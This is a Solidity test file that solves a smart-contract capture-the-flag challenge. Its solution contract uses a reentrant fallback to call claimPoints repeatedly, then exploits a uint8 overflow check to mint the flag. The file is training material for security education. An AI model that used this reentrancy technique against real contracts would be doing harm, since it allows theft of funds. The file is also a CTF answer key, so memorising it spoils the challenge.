// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {BaseTest} from "../BaseTest.sol";
import {Season2Challenge6} from "../../../src/season2/Season2Challenge6.sol";

contract Challenge6Solution {
    Season2Challenge6 challenge;
    uint256 count = 0;

    constructor(Season2Challenge6 _challenge) {
        challenge = _challenge;
    }

    function solve() external {
        // Step 1: Use reentrancy to gather 59 points
        // We need 59 points: 50 to upgrade 5 levels, and 9 remaining to satisfy the equation
        challenge.claimPoints();

        // Step 3: Once we have 59 points, upgrade level 5 times
        // Current state: points=59, levels=0
        for(uint i=0; i<5; i++) {
            challenge.upgradeLevel();
        }
        // Current state: points=9, levels=5

        // Step 4: Mint the flag
        // Verify math: 
        // 9 < 10 (Pass)
        // 9 * 5 = 45 >= 30 (Pass)
        // 9 << 5 = 288. uint8(288) = 288 - 256 = 32 (Pass)
        challenge.mintFlag();
    }

    // Step 2: Fallback function re-enters claimPoints
    fallback() external payable {
        if (count < 58) { // We want 59 total, initial call + 58 re-entries
            count++;
            challenge.claimPoints();
        }
    }
}

contract Challenge6Test is BaseTest {
    Season2Challenge6 challenge6;

    function setUp() public {
        setUpChallenges();

        vm.startPrank(ADMIN);
        challenge6 = new Season2Challenge6(address(nftFlags));
        nftFlags.addAllowedMinter(address(challenge6));
        vm.stopPrank();
    }

    function test_challenge6() public {
        vm.startPrank(PLAYER, PLAYER);

        Challenge6Solution solution = new Challenge6Solution(challenge6);
        solution.solve();

        // DONE: You should have obtained the flag for challenge #6
        assertTrue(nftFlags.hasMinted(PLAYER, 6));
    }
}